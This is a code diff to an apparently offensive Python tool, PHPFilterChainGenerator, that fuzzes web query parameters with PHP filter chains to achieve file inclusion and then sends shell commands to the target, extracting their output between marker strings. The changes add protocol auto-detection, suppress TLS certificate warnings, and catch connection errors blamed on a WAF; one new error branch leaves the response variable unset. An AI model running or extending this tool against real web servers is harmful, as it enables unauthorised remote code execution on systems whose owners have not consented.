@@ -11,12 +11,15 @@ from rich.console import Console
 from prompt_toolkit import PromptSession
 from prompt_toolkit.formatted_text import HTML
 from prompt_toolkit.history import InMemoryHistory
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class PHPFilterChainGenerator:
 
     def __init__(self, url, silent=False):
         self.console = Console()
-        self.url = url
+        self.url = self.ensure_correct_protocol(url)
         self.silent = silent
         self.file_to_use = "php://temp"
         self.string = self._generate_random_string()
@@ -91,6 +94,19 @@ class PHPFilterChainGenerator:
             (self.generate_filter_chain(f"<?php echo '{self.string}'; ?>"), re.compile(fr'{self.string}')),
         ]
 
+    def ensure_correct_protocol(self, url):
+        if not url.startswith(('http://', 'https://')):
+            try:
+                requests.get('https://' + url, timeout=3, verify=False)
+                return 'https://' + url
+            except requests.exceptions.RequestException:
+                try:
+                    requests.get('http://' + url, timeout=3, verify=False)
+                    return 'http://' + url
+                except requests.exceptions.RequestException:
+                    pass
+        return url
+    
     def _generate_random_string(self, length=6):
         return ''.join(random.choice(string.ascii_letters) for _ in range(length))
     
@@ -129,7 +145,12 @@ class PHPFilterChainGenerator:
                 new_params[param_name] = file_path
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                response = requests.get(fuzzed_url, verify=False)
+                
+                try:
+                    response = requests.get(fuzzed_url, verify=False)
+                except requests.exceptions.ConnectionError:
+                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
+                    return False, None    
 
                 match = file_regex.search(response.text)
                 if match:
@@ -180,7 +201,11 @@ class PHPFilterChainGenerator:
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
 
-                response = requests.post(fuzzed_url, data={"_": cmd})
+                try:
+                    response = requests.post(fuzzed_url, data={"_": cmd}, verify=False)    
+                except requests.exceptions.ConnectionError:
+                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
+                        
                 pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                 response_content = pattern.search(response.text)
                 if response_content:
